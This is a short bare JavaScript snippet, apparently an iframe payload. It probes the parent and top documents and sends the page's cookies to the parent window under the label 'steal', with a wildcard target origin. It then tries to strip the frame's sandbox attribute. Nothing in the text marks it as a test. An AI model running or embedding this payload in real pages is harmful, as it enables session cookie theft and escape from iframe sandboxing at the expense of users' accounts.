console.log(document.domain);
console.log(parent.document);
console.log(top.document);
parent.postMessage({steal: document.cookie}, "*");
frameElement.removeAttribute("sandbox");
